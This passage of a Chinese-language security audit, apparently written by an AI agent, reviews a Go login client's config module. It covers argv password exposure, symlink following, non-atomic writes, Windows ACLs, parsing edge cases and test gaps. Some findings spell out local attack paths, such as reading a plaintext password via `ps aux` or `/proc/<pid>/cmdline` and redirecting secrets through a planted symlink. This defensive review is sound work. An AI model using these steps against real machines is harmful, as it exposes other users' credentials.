  // cli.go:372-375
  if len(cfg.Accounts) == 0 {
      cfg.Accounts = []config.Account{{Password: *o.password, PasswordSource: config.SourceRun, ISPs: []string{""}}}
  } else {
      cfg.Accounts[0].Password = *o.password
      cfg.Accounts[0].PasswordSource = config.SourceRun
  }
  ```
  程序对 `--password` 只提示"add --save to write them to the config file"（`cli.go:605-607`），**没有**提示 argv 对同机其他用户可见。
- 攻击路径：前置＝多用户机器/路由器，`/proc/sys/kernel/yama`/`hidepid` 未开启（默认）。操作者按发行脚本只设置 `uci set sdautologin.main.password=SECRET` 重启服务 → `ps aux`、`cat /proc/<pid>/cmdline` 对任何本地用户可读，明文密码直接暴露；`--save` 那次调用还会把密码写进文件、并留在 shell 历史里。脚本自身的注释承认了这一点（并说明同时给出 `password_file` 时文件优先），但代码侧没有任何防护。
- 影响：机密性（明文凭据对同机非特权用户可见）；一次性/每次启动取决于部署方式。
- 修复：程序侧：`--password` 改为从 stdin/tty 读取（或用 `LoadCredential`/`--password-file`），至少在检测到 argv 中出现密码时打印明确警告；发行脚本把 `password_file`/`LoadCredential` 作为唯一路径（不再支持 `--password=` 直传），文档中删去 `--password=SECRET` 的示例。
- 置信度：高（argv 可见性为操作系统既定行为，调用点由读码与脚本确认）。

### [S3] 测试盲区：Windows ACL 零覆盖、只断言 mode 数值、目录缺口被写成期望、失败路径无用例

- 类别：测试盲区
- 位置：
  - `internal/config/config_test.go:788-790`、`internal/config/config_test.go:823-825`：`if runtime.GOOS == "windows" { t.Skip("permission bits are a Unix thing") }`（两处跳过，因此 `internal/config` 下**没有任何** `*_windows_test.go`，`restrictToOwner`/`protect` 的 Windows 分支零覆盖）
  - `internal/config/config_test.go:802-804`、`:814-816`、`:847-849`：`if got := fileMode(t, path); got != 0o600` —— 只比对 `os.Stat` 的 mode 数值
  - `internal/config/config_test.go:859-866`：`fileMode()` 只做 `os.Stat(...).Mode().Perm()`
  - `internal/config/passwordfile_test.go:335-337`、`:342-350`：目录模式断言；第二条把"已存在的目录即便过宽也不收紧"写成**期望**（`// does not tighten a mode somebody chose for a directory that was already there`），等于把 S2 第 5 条的缺口固化为契约
  - `internal/config/passwordfile_test.go:52-70`、`:91-101`：解析用例只有 5 + 7 条，且错误断言是 `strings.Contains(err.Error(), want)`；无 BOM、无非法 UTF-8、无 CR 中置、无"单密码含冒号"、无多行无冒号、无 FIFO/超大输入
  - 全模块无：符号链接用例、只读目录/ENOSPC 的 `Save` 失败用例、世界可写目录用例、密码文件权限用例、"通知不含秘密片段"的断言
- 证据：
  ```go
  if runtime.GOOS == "windows" { t.Skip("permission bits are a Unix thing") }        // config_test.go:788-790
  if got := fileMode(t, path); got != 0o600 { t.Errorf("config.json is %#o, want 0600", got) }  // 802-804
  ```
- 攻击路径：不适用（这是覆盖面问题）。要点：① Windows ACL 行为（`PROTECTED_DACL`/`GENERIC_ALL`/继承阻断）从未被任何测试验证，而它是 Windows 上唯一的保护手段；② 所有权限断言都只读 mode 数值，没有一个用例以"另一个用户/进程"的身份尝试读取，也没有扩展 ACL/default ACL 用例，因此 S2 第 5 条的缺口不会被现有测试发现；③ 没有断言证明"通知里不含秘密"，而实测中 `p@ss:word` 的片段确实会进入通知；④ 失败路径（只读目录、ENOSPC、符号链接）无回归网，S2 第 3/4 条可以无声回归；⑤ 我实测 `go test ./internal/config/`（Linux，Go 1.26.0）**通过**——即上述缺口与"全部测试通过"并存。
- 影响：无直接安全影响；但本模块的安全性质在评审与回归中都不可观测（"绿灯"不代表"文件确实不可被他人读"）。
- 修复：新增 `protect_windows_test.go`（`//go:build windows`，断言设置后 DACL 只含当前用户、`SE_DACL_PROTECTED` 置位、继承的 ACE 已消失）；新增"以第二个 uid 读文件必须失败"的 Linux 用例（可用 `syscall.Stat_t.Uid`+`setfacl` 或 `unshare`）；新增符号链接/只读目录/ENOSPC 的 `Save` 失败用例（可用 `RLIMIT_FSIZE` 稳定构造，我已验证可行）；补齐解析边界用例（BOM/非法 UTF-8/CR 中置/单密码含冒号/多行无冒号）；新增"任何 notice/error/Summary 都不含秘密片段"的断言。
- 置信度：高（跳过点与断言强度均为逐行读到的；`go test` 结果已实测）。

### [S4] Windows ACL 只授 `GENERIC_ALL` 给进程令牌用户：机制本身正确，但 SYSTEM/Administrators 被排除，且令牌取的是进程而非线程

- 类别：权限边界 / 加固（观察，非漏洞）
- 位置：`internal/config/protect_windows.go:16-34`
- 证据：
  ```go
  user, err := windows.GetCurrentProcessToken().GetTokenUser()
  acl, err := windows.ACLFromEntries([]windows.EXPLICIT_ACCESS{{
      AccessPermissions: windows.GENERIC_ALL,
      AccessMode:        windows.GRANT_ACCESS,
      Trustee:           windows.TRUSTEE{ TrusteeForm: windows.TRUSTEE_IS_SID, ... }}}, nil)
  return windows.SetNamedSecurityInfo(path, windows.SE_FILE_OBJECT,
      windows.DACL_SECURITY_INFORMATION|windows.PROTECTED_DACL_SECURITY_INFORMATION, nil, nil, acl, nil)
  ```
- 逐条回答任务书的问题：① `PROTECTED_DACL_SECURITY_INFORMATION` **确实**阻断继承——传进去的是一份只含一个 ACE 的**全新** DACL，父目录继承来的 ACE 不在其中，因此"阻断继承 + 只留属主"的语义成立（替换而非叠加，这是正确的做法）；② `GetCurrentProcessToken()` 取的是**进程**令牌；若将来引入模拟（impersonation），ACL 会被授给错误的 SID。我查过本仓库：**没有任何** `ImpersonateLoggedOnUser`/`RevertToSelf`/`SetThreadToken` 调用，所以目前不可利用（**无法验证**的部分：需要真实的 Windows 运行环境与模拟场景才能确认；本机无 Windows Go 工具链）；③ SYSTEM/Administrators 被有意排除：换不到安全性（管理员随时可以取得所有权再改 ACL），代价却是运维性——以 SYSTEM 运行的卸载程序/备份/杀软/漫游配置同步对该文件 `ACCESS_DENIED`，卸载可能留下明文密码文件，升级工具若以 SYSTEM 运行也读不到它；④ 失败时：`restrictToOwner` 的错误在 `Save` 里被丢弃（`config.go:542`），由调用方的 `Protect()` 事后记一条 WARN 并继续运行（见 S2 第 4 条）。
- 影响：可用性/运维（备份、卸载、企业策略）；无直接机密性影响。
- 修复：DACL 里同时加 SYSTEM 与 Administrators 的 ACE（保留 `PROTECTED_DACL`）；若坚持排除，须在文档与卸载脚本里说明"需先取得所有权"；令牌来源改为线程有效令牌（`OpenThreadToken` 失败时回落进程令牌），并为将来可能的模拟留出正确语义。
- 置信度：高（读码 + 本仓库无模拟调用的事实）；③④ 的具体系统行为为中（未在 Windows 上执行）。

## 问题回答（Q1–Q8）

### Q1 `config.json` 的键清单、默认值、校验规则；哪些是凭据；哪些键被改会造成安全后果

| 键 | 默认值（`config.go:133-162`） | 装载时的处理（`normalize`, `config.go:284-321`） |
|---|---|---|
| `accounts[]` | `[]` | 每条 `username` 去空白、`isps` 去重去空（`config.go:339-345`）；为空则补 `[""]` |
| `accounts[].username` | — | `TrimSpace` |
| `accounts[].password` | — | **凭据**；不校验 |
| `accounts[].passwordSource` | — | 内存字段，`omitempty` 且 `marshal` 强制清空（`config.go:562`），从不落盘 |
| `accounts[].disabled` | `false` | 不校验 |
| `accounts[].isps` | — | `CompactSuffixes` |
| `username` / `password` / `accountSuffix`（旧） | `""` | **凭据**（旧字段）；`migrate()` 搬进 `accounts` 后清空并永不写回（`config.go:325-335`） |
| `rememberPassword` | `true` | 不校验；决定密码是否落盘（`config.go:563`） |
| `passwordFile` | `""` | `TrimSpace`；**任意路径**（见 S2 第 6 条） |
| `portalBaseUrl` | `http://10.9.1.3/` | 空值才回落默认（`config.go:307-309`）；**非空即原样接受** |
| `eportalUrl` | `http://10.9.1.3:801/eportal/` | 同上（`config.go:310-312`）；**凭据去向** |
| `accountPrefix` | `,0,` | **完全不处理**（可为空） |
| `checkIntervalSeconds` | `15` | 钳制到 `[5, 86400]` |
| `httpTimeoutSeconds` | `6` | 钳制到 `[2, 900]` |
| `autoLogin` / `checkInternet` / `verboseLog` / `logToFile` / `switchToPreferredService` | 均 `true` | 不校验 |
| `probeUrls` | 3 个 http 探测地址 | `CompactProbes`（`config.go:766-773`）只在设置页调用 |
| `jsVersion` | `"3.3.3"` | 空值才回落；拼进 URL 但被转义 |
| `language` | `"auto"` | 非 `zh/en` 一律回落 `auto` |
| `checkForUpdates` | `false` | 不校验（更新地址是编译期常量 `internal/app/payload.go:16`，**不可由配置改向**） |
| `updateChannel` | `"stable"` | 未知值按 stable 处理（`config.go:200-205`） |

**校验规则的关键事实**：`LoadConfig` **从不调用 `Validate()`**（只有设置页在 `internal/app/settings.go:557` 调用）。因此手工编辑、安装包或服务管理器写入的 `config.json` 只经过 `normalize`（钳制数值、空值兜底），URL 合法性**根本不检查**——已实测：`portalBaseUrl:"not a url at all"`、`eportalUrl:"ftp://x/"`、`accountPrefix:""` 被原样接受，`Account("s1","")` 返回 `"s1"`。

**凭据**：`accounts[].password`、旧 `password`、`passwordFile` 指向的文件内容、`passwordFile` 路径本身（指向秘密）。
**被恶意修改会造成安全后果的键**：`eportalUrl`/`portalBaseUrl`（凭据去向，S2-1）、`passwordFile`（任意文件读取与首行外带，S2-6）、`accountPrefix`（凭据格式，S3）、`rememberPassword`（决定明文是否落盘）、`autoLogin`（自动外发频率）。`checkForUpdates`/`updateChannel` 不构成改向（更新源是常量，且 `update` 包对下载物有签名校验，见 `internal/update/sign.go`——该模块不在本次范围内，未审）。

### Q2 写入路径的精确分解

1. `c.path` 来源：`cmd/SDAutoLogin/cli.go:570` → `config.LoadConfig(filepath.Join(appDir, "config.json"))`；`appDir` 由 `chooseAppDir`（`cmd/SDAutoLogin/main.go:189-212`）决定，顺序为 `--home=DIR` → 可执行文件所在目录（当它可写、不在 `/bin`、`/sbin`、`/usr/bin` 等系统目录、且不是 `go-build`/`Temp` 构建目录）→ 仅当可执行文件在构建目录时用 `os.Getwd()` → `perUserDir()`。
2. `os.UserConfigDir()` 失败时：`perUserDir()` 返回错误（`main.go:252-255`），`chooseAppDir` **没有任何进一步回落**，直接返回错误（`main.go:210-211`）：`no directory to keep config.json and logs in: %v, and %v; pass --home=DIR to name one`。托盘路径不吞这个错误（`main.go` 早期 `os.Exit(2)`）。`perUserDir` 本身还会 `MkdirAll(base, 0o755)`（`main.go:257`）——即 `$XDG_CONFIG_HOME`/`%AppData%` 若不存在会以 **0755** 创建（仅创建时；目录内容由内层 0700 目录保护）。
3. 目录与文件权限：目录 `os.MkdirAll(dir, 0o700)`（`configDirMode`，`config.go:512, 525`）——**只在创建时**生效，已存在目录的模式从不检查、从不收紧；文件 `os.WriteFile(c.path, ..., 0o600)`（`configFileMode`，`config.go:507`）——新文件由 `open(2)` 直接以 0600 创建（Unix 上不存在"先宽后紧"的创建窗口）；随后 `os.Chmod(c.path, 0600)`（`config.go:536`）用来修正**已存在**的过宽文件，再 `restrictToOwner`（Windows ACL）。
4. 是否过宽：目录 0700 / 文件 0600 的取值合理；问题是**只对"新建"生效**，且**目录自身从不被验证**（看到 S2-2/S2-5）。Windows 上这两个 mode 参数被 Go 忽略，目录得到 `%AppData%` 继承来的 ACL（通常只有 用户/SYSTEM/Administrators），文件的 ACL 靠 `restrictToOwner` 事后设置。
5. 是否原子：**不原子**。`os.WriteFile` = `O_WRONLY|O_CREATE|O_TRUNC`，先截断再写；无临时文件、无 `rename`、无 `fsync`、无备份（已实测失败后旧配置被毁，S2-3）。
6. 失败时的残留：可能是 0 字节（进程在截断与写之间被杀）或半截 JSON（ENOSPC/EFBIG，必然已丢失旧内容）；`Save` 的错误会返回给调用方，但**旧配置无法恢复**；`restrictToOwner` 的失败不进 `Save` 的返回值（S2-4）。权限过宽的文件本身在失败时会短暂存在（继承 ACL），直到调用方 `Protect()`。

### Q3 TOCTOU / 符号链接（均已执行验证）

- `restrictToOwner`/`protect` 与写入之间：**不存在"先创建后改权限"的创建窗口**（新文件由 `open(...,0600)` 创建），但存在**两个真实窗口**：① 已存在的过宽文件被 `O_TRUNC` 写入期间仍是旧模式，`Chmod` 在写完之后才执行——同机攻击者可以在该窗口内读到新写入的明文（需要旧文件确实过宽；启动时的 `Protect()` 会先把它收紧，所以窗口主要在"运行期间被外部改宽"或"首次运行前的旧文件"场景）；② Windows 上 ACL 在**写完之后**才按路径设置，且失败被丢弃（S2-4）。
- 攻击者能否放置符号链接：**能，且程序会跟着走**。实测：`config.json` → `victim.txt` 的符号链接，`Save()` 把 JSON（含明文密码）写进目标并把目标 chmod 成 0600（`secret written through the link: true ; target mode now 0600`）；`MkdirAll` 对**符号链接目录**返回 `err=<nil>`，配置随之落到链接指向的目录。
- 是否使用 `O_NOFOLLOW`/`Lstat`/先创建后改权限：**都没有**。全模块没有 `O_NOFOLLOW`、没有 `os.Lstat`、没有 `O_EXCL`、没有句柄式 ACL API（`SetNamedSecurityInfo` 是按路径的版本）；`protect_other.go:19` 用的是跟随链接的 `os.Stat`，`os.Chmod` 同样跟随链接。

### Q4 `protect_other.go` 的 `os.Chmod` 逻辑

- `mode&0o077` 只看 9 个 mode 位，**漏掉**：POSIX 扩展 ACL（`setfacl`）、父目录 default ACL 继承（新文件会继承 default ACL，而 mode 位显示 0600）、父目录本身的过宽/可写、文件属主不是当前用户、以及 `os.Stat` 自身失败（`EACCES`/`EIO`）时被当成"没问题"返回空串。以上**都不是理论问题**：`0600` + 一条 `user:alice:r--` 的扩展 ACL 即可让 alice 读到明文密码，而 `Protect()` 报"一切正常"。
- `os.Stat` → `os.Chmod` 竞态：存在。攻击者把路径换成符号链接后，`Chmod` 作用于目标（`chmod(2)` 跟随链接）；两者都按路径、都无 `O_NOFOLLOW`/`fchmod`。
- 报告文本回显路径：用 `%s` 逐字拼入（`protect_other.go:29,33`），换行/控制字符不被转义 → 若路径可控（`--home`、`passwordFile` 在别处同样如此）即可注入日志行或改写终端（S3 第 3 条）。
- 已实测的正面行为：对 0644 的 `config.json`，`Protect()` 报告 `0644` 并收紧到 0600（既有测试 `config_test.go:822-856` 覆盖）；对 0600 文件返回空串（不重复告警）。

### Q5 `protect_windows.go` 的 ACL 替换（逐条）

- `PROTECTED_DACL_SECURITY_INFORMATION` 是否真阻断继承：**是**。传进去的是只含一个 ACE 的**新** DACL，父目录继承的 ACE 不在其中；`PROTECTED_DACL` 又标记该 DACL 不继承，二者结合达到"只留属主"的语义。
- 只授 `GENERIC_ALL` 给当前进程用户：可接受但不完整（`GENERIC_ALL` 含 `WRITE_DAC`/`WRITE_OWNER`，对属主是常规做法）。`GetCurrentProcessToken()` 取的是**进程令牌**：在没有模拟的进程里等于实际写入者；本仓库无模拟调用，因此当前正确，但对将来的 impersonation 是隐患（建议 `OpenThreadToken` 优先）。
- SYSTEM/Administrators 被排除：见 S4 条，机制上换不到安全性，代价是运维（备份/卸载/同步/杀软）以及"卸载后明文残留"。
- 失败时继续还是中止：**继续运行**。`Save` 内部 `_ = restrictToOwner(c.path)` 丢弃错误并返回 `nil`（`config.go:542`）；只有 `os.Chmod` 的错误会返回（Windows 上几乎总是 nil）。调用方 `Protect()`（`internal/app/appstate.go:31,162`、`cmd/SDAutoLogin/cli.go:598`）事后记 WARN 并继续。后果：明文密码可能落在人人可读的卷上而程序照跑（S2-4）。

### Q6 `parsePasswordFile` 的全部解析边界（真实 Go 1.26.0 执行结果）

| 输入（Go 字符串字面量） | 结论 | 判定 |
|---|---|---|
| `""` | `ERROR: holds no password` | 正确 |
| `"\n"` / `"\n\n"` | `ERROR: holds no password` | 正确 |
| `"secret"`（尾部无换行） | `single="secret"` | 正确 |
| `"two spaces  \r\nsecond line\n"` | `single="two spaces  "` | 正确（CRLF 去掉、行尾空格保留、第 2 行按规则忽略） |
| `"s1:one\r\ns2:two\r\n"` | `list=[{s1,one},{s2,two}]` | 正确 |
| `"s1:one\rs2:two"`（仅 CR） | `list=[{name:"s1" secret:"one\rs2:two"}]` | **缺陷**：两条记录合并，第二组账号密码成为第一组的密码内容 |
| `"a:b:c\n"` / `"a:b:c:d\n"` | `{name:"a" secret:"b:c"}` / `{a,"b:c:d"}` | 正确（首个冒号切分） |
| `"s1:se:cret\n"` | `{s1,"se:cret"}` | 正确（密码里的冒号保留） |
| `"s1:\n"` | `ERROR: line 1 gives s1 no password` | 正确 |
| `":x\n"` | `ERROR: line 1 names no account` | 正确 |
| `"  s1  :pass\n"` / `"\ts1\t:pass\n"` | `{name:"s1" secret:"pass"}` | 正确（name 用 `TrimSpace`） |
| `"s1: pass\n"` | `{s1," pass"}` | 正确（secret 不去空白，符合"密码可以空格结尾"的注释） |
| `"s1:one\n\ns2:two\n"` | 两条记录 | 正确（空行跳过） |
| `"s1:one\n   \ns2:two\n"` | `ERROR: line 2 holds no colon ...` | **不一致**：只含空格的行不是空行，报错；与"空行跳过"不对称（fail-closed，可接受但要说明） |
| `"s1:one\nstray\n"` | `ERROR: line 2 holds no colon while the others name an account` | 正确（缺冒号 → **整文件拒绝**，不会把字符串猜成密码）——这正是任务书问的"某行缺冒号"的情形：**fail-closed**，所有条目都拿不到文件里的密码，只保留 `config.json` 里的旧密码，并给出一行通知 |
| `"s1:one\ns1:two\n"` / `"s1:one\n s1 :two\n"` | `ERROR: line 2 names s1 a second time` | 正确（trim 后判重） |
| `"pass1\npass2\n"`（全部无冒号） | `single="pass1"` | **缺陷**：其余行静默丢弃、无告警；若文件本意是"每行一个账号的密码"，第 2 行起被无视 |
| `"p@ss:word\n"`（单密码含冒号） | `list=[{name:"p@ss" secret:"word"}]` → 通知里出现 `p@ss` | **缺陷**：误判形态 + 密码片段进日志（S3 第 1 条） |
| `"user:pass\nother\n"` | `ERROR: line 2 holds no colon ...` | 同上，整文件拒绝 |
| `"\uFEFFsecret\n"`（UTF-8 BOM） | `single="\ufeffsecret"` | **缺陷**：BOM 成为密码的一部分（对照 `config.go:180` 已为 config.json 处理 BOM） |
| `"\uFEFFs1234567:pass\n"` | `name="\ufeffs1234567"` | **缺陷**：账号名带 BOM，与 `s1234567` 不匹配 → 报"无此账号" |
| `"s1:\xffpass\n"`（非法 UTF-8） | `{s1,"\xffpass"}` | 解析不报错；注意：该密码若要写回 JSON 会被 `encoding/json` 替换成 `U+FFFD`（文档化行为，**未能执行验证**）；来自文件时因 `SourceFile` 不落盘，故实际影响主要在极端配置路径 |
| `"\xfesecret\n"` | `single="\xfesecret"` | 同上 |
| `"s1:pa\rss\n"` | `{s1,"pa\rss"}` | 中间 CR 保留在密码里（与"仅 CR 文件"合并缺陷同源） |
| `"s1:pass\r"`（尾部 CR 无 LF） | `{s1,"pass"}` | 正确 |
| `"s1\x00:pass\n"` | `{name:"s1\x00" secret:"pass"}` | NUL 保留在账号名里（不匹配任何账号；无解析错误） |
| `"\nsecret\n"` | `ERROR: holds no password` | "第一行即密码"的既定语义，可接受（但值得在文档里写明） |
| 超长行 | 无放大：`splitLines` 只做一次 `string(data)` 复制 + 每行子切片，峰值约 2× 文件大小 | 正确（真正缺的是 `ReadFile` 无上限，见 S3 第 4 条） |

另外两个一致性缺陷（读码确定，非缺陷级别但值得记）：`loadPasswords` 的 `byName` 用**精确**匹配（`config.go:252`），而 `Config.Match`/`sameAccount` 用 `EqualFold`——密码文件里写成 `S1234567` 会被报成"无此账号"；账号重名时 `byName` 映射到**最后一个**（`config.go:251-253`），而 `KeepPasswordsFrom` 对重复账号填的是**第一个**，两处语义相反。

### Q7 凭据泄漏进日志/错误/HTTP 响应的路径（本模块内）

- `fmt.Errorf`/通知**从不插入密码本身**：全部错误串只含路径、账号名、mode、行号（`config.go:233,237,243,265`；`passwordfile.go:60,72,77,79,81,87`）。`Summary()`（`config.go:664-683`）只输出账号名与服务类型，既有测试 `config_test.go:908-929` 断言它不含密码。
- 设置页方向**没有**泄漏：`pageConfig`（`internal/app/settings.go:496-514`）把每个 `Password` 置空、只回传 `passwordSource`，而配置到页面的三处序列化点（`settings.go:481`、`:575`、`:677`）都经过它——即 `config.go:26-28` 的注释（"never sent to a browser"）成立。日志侧 `main.go:119` 用的是 `Summary()`，`portal.go:221-222` 只记 `user_account`/IP/mac/jsVersion，回复体经 `MaskSecrets`（`portal.go:381-385`）打码。
- **唯一实测到的秘密外泄**是间接的：含冒号的单密码被误读为列表后，密码的冒号前片段作为"账号名"进入 `passwordNotice`（`config.go:265-266`），随后被 `logging.Log.Warn` 写进 `logs/app.log` 与设置页提示；`p@ss:word` → 日志出现 `p@ss`。另外受控路径的 `%s` 回显允许注入日志行（S3 第 3 条）。
- `splitLines` 的内存放大：**没有放大**（见 Q6 末行）；风险来自 `os.ReadFile` 无上限（S3 第 4 条，FIFO 阻塞已实测）。

### Q8 测试审查（行号见 S3 第 7 条）

- `t.Skip`：`config_test.go:788-790`（Windows 上跳过权限位断言）、`config_test.go:823-825`（Windows 上跳过"过宽模式被修正"）。合理，但代价是 **`internal/config` 下没有任何 `*_windows_test.go`**，`restrictToOwner`/`protect_windows.go` 的全部行为零覆盖。
- 只检查"无错误"、不检查"真的不可被他人读"：`config_test.go:802-804`、`:814-816`、`:847-849` 均只比对 `os.Stat().Mode().Perm()` 的数值（`fileMode` 见 `:859-866`）；`passwordfile_test.go:335-337` 同样只比目录 mode。没有任何用例以另一个 uid/进程身份尝试读取文件，也没有扩展 ACL/default ACL/世界可写目录用例。
- 被测试固化为"契约"的缺口：`passwordfile_test.go:342-350` 明确断言"第二次保存不会收紧已存在目录的模式"，把 S2-5 的目录缺口写成期望。
- 解析用例的覆盖：`passwordfile_test.go:12-71`（5 例）与 `:76-102`（7 例）覆盖了空文件/换行/CRLF/无尾换行/多冒号/空名/空密码/重复名/未命名行——**未覆盖** BOM（实测会坏）、非法 UTF-8、CR 中置或 CR-only 文件、单密码含冒号（实测会把密码片段送进通知）、多行无冒号（实测静默丢弃）、FIFO/超大输入、"通知与错误不含秘密"这一性质。错误断言强度较弱（`strings.Contains`）。
- 测试替身造假象：没有 mock/stub（本模块的测试都走真实文件系统），因此**不存在"测试替身上造假象"**；但 `TestSaveKeepsTheFileToItsOwner`/`TestALooseModeIsPutRightAndReported` 的名字所承诺的性质（"文件只属于属主"）**只由 mode 数值支撑**，在带扩展 ACL 或 Windows 上并不成立——这是最需要补强的一处。
- 未在本次范围内审查的测试：`internal/app/settings_test.go`、`internal/service/service_test.go`、`cmd/SDAutoLogin/cli_test.go`（它们覆盖了跨包行为，如 `settings_test.go:640` 与 `:1081` 断言运行配置里的密码；我发现 S2-7 时未审这些用例是否已注意到 run 来源的密码）。

## 架构与设计层面问题

1. **单一信任根**：`config.json` 同时是"凭据仓库"和"凭据去向（门户地址）的信任锚"，而它本身没有任何完整性保护（无签名、无 ACL 之外的校验、无第二来源）。任何能改动它的主体都能改向凭据，或直接读走明文。正确的结构是把"去哪里登录"从用户可写设置里挪出去（部署文件/编译期常量/首次配置后的只读记录 + 变更需显式确认），或者对 `config.json` 做认证（HMAC + 独立密钥），而不是靠"文件权限挡住一切"。
2. **"事后按路径收紧"的模型**：整个模块的保护都是"先写，再按路径设置权限/ACL"。把关键资产交给一个"写完再补保护"的序列，必然带来窗口、符号链接与失败静默三类问题（S2-2、S2-4）。反向顺序（先以句柄收紧再写入）才能消除它们。
3. **凭据来源的语义没有闭合**：`config`/`file`/`run` 三种来源只被"是否写回文件"这一条规则使用，而该规则在 `markStoredPasswords`（把空来源改标 `config`）与 `PageBase`（只清理 `file`）之间并不一致，导致 `run` 来源的秘密被静默落盘（S2-7）。来源应当是不可变的、判定唯一（"这一份秘密允许持久化吗"），并在 `Save` 处强制断言。
4. **失败处理的哲学不一致**：`Save` 丢 ACL 错误（`_ =`）却把 `Chmod` 错误返回；`LoadConfig` 对坏文件是硬错误（服务退出）而 GUI 又回落默认值；`Protect()` 把"查不了"当"没问题"。三者合并的后果是"最危险的情况（明文外露）最安静，最无害的情况（解析失败）最吵"。
5. **保护面不对等**：`config.json` 有 mode+ACL 收紧与报告，**密码文件没有**，**目录没有**，而注释却声称检查了密码文件（S3 第 4 条）。散布在各处的"文件是私密的"注释（`protect_other.go:10-12`、`appstate.go:28-30`）把未经验证的假设写成了保证，比没有注释更危险。
6. **静态凭据无加密/无 KMS 路径**：全仓库默认 `rememberPassword=true`，把明文写进用户可读的文件。已有 `LoadCredential` 与 `--password-file` 机制，但默认路径、发行脚本示例（`--password=SECRET`）与文档都在把用户推向"明文落盘/进 argv"。至少在 Windows 上可以用 DPAPI（`CryptProtectData`）、Linux 上可用 systemd 凭据或内核 keyring 作为默认，把明文文件降级为兼容路径。
7. **凭据进 URL**：登录是 `GET` 且 `user_password` 在查询串里（`portal.go:212,224`），默认门户还是 `http://`（明文）。即使门户只在内网，密码也会进入沿途代理/IDS/门户访问日志，并可能被 `openPortal` 打开到浏览器（`settings.go:693-700` 打开的是 `portalBaseUrl`）。这不是本模块的代码，但"配 `eportalUrl` 的人"和"配 `config.json` 的人"是同一个，风险应由配置层一起评估。

## 覆盖声明

逐文件、逐行读完（行号为本报告中引用的真实行号；任务书括号里的行数是**忽略空行**的统计，实际行数如下）：

| 文件 | 实际行数 | 说明 |
|---|---|---|
| `internal/config/config.go` | 774 | 全文读完（任务书写 714：那是 `Measure-Object -Line` 忽略空行的结果） |
| `internal/config/passwordfile.go` | 90 | 全文 |
| `internal/config/protect_windows.go` | 48 | 全文（Windows 分支无法执行） |
| `internal/config/protect_other.go` | 35 | 全文 |
| `internal/config/config_test.go` | 1107 | 全文（任务书写 1016，同上） |
| `internal/config/passwordfile_test.go` | 351 | 全文（任务书写 326，同上） |

为判断跨包影响而读的相邻代码（**不在我的模块范围内，只作证据引用**，未逐行审）：`cmd/SDAutoLogin/main.go`（55-275、`chooseAppDir`/`perUserDir`）、`cmd/SDAutoLogin/cli.go`（370-425、533-660 及全文 grep）、`internal/app/appstate.go`（20-45、140-175）、`internal/app/settings.go`（460-600、628-700 及全文 grep）、`internal/app/payload.go`（全文）、`internal/portal/portal.go`（118-232 及全文 grep）、`internal/logging/log.go`（grep 权限常量）、`packaging/systemd/{system,user}/sdautologin.service`、`packaging/sysusers.d`、`packaging/openwrt/root/etc/init.d/sdautologin`、`packaging/deb/control/postinst`。

**没有读**（明确声明，可能影响结论的边界）：
- `internal/webui/` 下的嵌入式 HTML/JS（我未读设置页前端代码，因此"设置页提交的 JSON 是否带 `password` 字段"只在 Go 侧两种形态都验证过——见 S2 第 7 条，两种形态都复现）；
- `packaging/CMakeLists.txt`、`winres/`、`packaging/win*`（**Windows 安装包**：它决定 Windows 上 config.json 落在哪个目录、该目录的 ACL、以及卸载程序以什么身份运行——直接关系到 S2 第 2 条与 S4 条的现实性，**未能验证**）；
- `internal/update/*`（更新下载与签名校验）、`internal/service/service.go`（检查循环）、`internal/tray/*`、`internal/platform/*`（仅 grep 过权限相关片段）；
- `internal/app/settings_test.go`、`internal/service/service_test.go`、`cmd/SDAutoLogin/cli_test.go`（跨包测试未审）。

**工具链与执行**：任务书说"本机无 Go 工具链"，**这一前提与实际不符**：WSL `Ubuntu-24.04` 中存在 `/usr/bin/go`（`go1.26.0 linux/amd64`），与 `go.mod` 的 `go 1.26` 一致。因此我做了以下执行性验证（全部在 `/tmp/audit-A` 的仓库副本中进行，**未修改被审查的源码树**，只新增了我自己的探针测试文件）：
- `go vet ./internal/config/`：无输出（通过）。
- `go test ./internal/config/`（既有测试，Linux）：`ok sdautologin/internal/config 3.013s` 通过。
- `go build ./...`：无输出（通过）。
- 自建探针（8 个用例）执行结果已逐条引用在发现里：解析边界全表、符号链接文件与符号链接目录、0777 目录、0644 密码文件、`RLIMIT_FSIZE` 造成的写失败、FIFO 阻塞、`Validate`/`ValidHTTPURL`/装载路径、以及"run 来源密码落盘"。
- **无法执行**：Windows 端的一切（`protect_windows.go` 的 ACL 调用、`SetNamedSecurityInfo` 在 FAT/exFAT 上的失败、卸载/备份以 SYSTEM 运行的实际表现）、`/dev/zero` 的内存耗尽（故意未执行）、以及带扩展 ACL 的 `setfacl` 演示（本机权限与动机均不便，仅由"代码中不存在任何 ACL 读取"确定缺口）。以上各处已在对应条目里标注置信度。
- 一处次要观察：`Select-String -Path '<repo>\packaging\*'` 曾对子目录报"访问被拒绝"，但随后 `Get-ChildItem`/`Get-Content` 均成功，文件已读到，未影响结论。

**审查原则**：每条发现都带 `file:line` 与逐字证据；无法通过读码或执行确认的，已写成"未能执行/无法验证"而不是猜测。风格、命名、缺功能与主观偏好一律未写。

## 附录：关键代码摘录

```go
// config.go:507-512  权限常量
const configFileMode = 0o600
const configDirMode  = 0o700

// config.go:515-544  Save：目录只在创建时收紧、写不原子、ACL 错误被丢弃
func (c *Config) Save() error {
	c.normalize()
	data, err := c.marshal()
	if err != nil { return err }
	if dir := filepath.Dir(c.path); dir != "" && dir != "." {
		if err := os.MkdirAll(dir, configDirMode); err != nil { return err }   // 已存在目录不检查
	}
	if err := os.WriteFile(c.path, append(data, '\n'), configFileMode); err != nil { return err } // O_TRUNC，不原子
	if err := os.Chmod(c.path, configFileMode); err != nil { return err }
	_ = restrictToOwner(c.path)                                                // 失败被丢弃
	return nil
}

// config.go:546-549  Protect 只覆盖配置文件，不覆盖密码文件、不检查目录
func (c *Config) Protect() string { return protect(c.path) }

// config.go:561-565  marshal：只丢 SourceFile，SourceRun 会被写下去
	fromFile := c.Accounts[i].PasswordSource == SourceFile
	v.Accounts[i].PasswordSource = ""
	if !c.RememberPassword || fromFile { v.Accounts[i].Password = "" }

// config.go:210-216  markStoredPasswords：把无名来源改标为 config
	for i := range c.Accounts {
		if c.Accounts[i].Password != "" && c.Accounts[i].PasswordSource == "" {
			c.Accounts[i].PasswordSource = SourceConfig
		}
	}

// config.go:227-247  loadPasswords：任意路径、首行即密码
	path := strings.TrimSpace(c.PasswordFile)
	if path == "" { return "" }
	data, err := os.ReadFile(path)
	...
	if single != "" {
		if len(c.Accounts) == 0 { return fmt.Sprintf("the password file %s holds one password, ...", path) }
		c.Accounts[0].Password = single
